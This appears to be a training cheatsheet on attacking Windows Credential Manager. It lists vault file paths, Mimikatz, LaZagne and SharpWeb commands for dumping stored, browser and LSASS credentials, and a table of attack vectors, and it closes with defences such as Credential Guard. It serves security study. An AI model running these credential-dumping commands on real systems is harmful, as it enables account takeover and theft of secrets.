# Password Attacks: Attacking Windows Credential Manager - Cheatsheet

**Focus:** Attacking Windows Credential Manager

---

## Credential Manager Locations

```bash
# User Vault locations
%UserProfile%\AppData\Local\Microsoft\Vault\
%UserProfile%\AppData\Local\Microsoft\Credentials\
%UserProfile%\AppData\Roaming\Microsoft\Vault\

# System-wide vault
%ProgramData%\Microsoft\Vault\

# System profile vault
%SystemRoot%\System32\config\systemprofile\AppData\Roaming\Microsoft\Vault\
```

---

## Extracting Credentials

### Mimikatz (DPAPI)

```bash
#privilege::debug
# Standard credential dump
sekurlsa::logonpasswords

# Target specific vault credentials
vault::list
vault::cred /patch

# DPAPI manipulation
dpapi::vault /cred:target
dpapi::chrome
```

### LaZagne

```bash
# All supported applications
laZagne.exe all

# Specific targets
laZagne.exe browsers
laZagne.exe databases
```

### SharpWeb (Browser Credentials)

```bash
# Extract browser credentials
SharpWeb.exe run
```

---

## Key Concepts

- **DPAPI:** Data Protection API - protects encryption keys in Credential Manager.
- **Policy.vpol:** Contains AES keys for credential encryption.
- **Credential Guard:** Isolates DPAPI keys in memory enclaves (VBS).
- **Web Credentials:** Stored for websites and online accounts.
- **Generic Credentials:** Internal Windows resource credentials.

---

## Attack Vectors

| Vector | Description | Tool |
|--------|-------------|------|
| LSASS Dumping | Extract credentials from LSASS process | mimikatz, procdump |
| Credential Manager | Direct access to vault files | mimikatz, LaZagne |
| Browser Theft | Extract saved browser credentials | SharpWeb, LaZagne |
| DPAPI Abuse | Decrypt Credential Manager data | mimikatz |
| Kerberos Ticket Theft | Harvest TGT/TGS tickets | Rubeus, Kekeo |

---

## Remediation / Defense

- Enable **Credential Guard** to protect DPAPI keys.
- Use **Windows Hello** or **Windows Hello for Business**.
- Enable **Windows Defender Credential Guard**.
- Monitor LSASS access and privileged DPAPI calls.
- Implement **Windows Hello for Business** with PIN/Biometric.

---

*Last Updated: 2026-04-17*
*Module: Password Attacks - Attacking Windows Credential Manager*